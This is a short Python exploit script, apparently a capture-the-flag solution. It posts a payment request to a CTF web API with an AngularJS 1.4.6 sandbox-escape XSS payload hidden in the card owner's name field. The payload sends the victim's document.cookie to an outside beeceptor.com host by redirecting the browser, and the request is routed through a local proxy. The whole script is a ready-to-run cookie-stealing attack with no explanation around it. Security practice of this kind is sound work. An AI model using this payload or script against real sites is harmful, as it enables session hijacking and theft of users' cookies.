#!/usr/bin/env python3

import requests
import json

url = 'http://scammerland2.ch.wh.edu.pl/api/pay'

payload = "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"></script><div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.location=\"https://btsctf2022.free.beeceptor.com?d=\"+document.cookie;//');}} </div>"


data = {"card_number":"2222111111111111",
		"owner_name": payload,
		"expire_date":"11 / 2025",
		"cvv":"123"
		}

proxies = { 'http' : 'http://localhost:8080'}

r = requests.post(url,json=data,proxies=proxies)
print(r.text)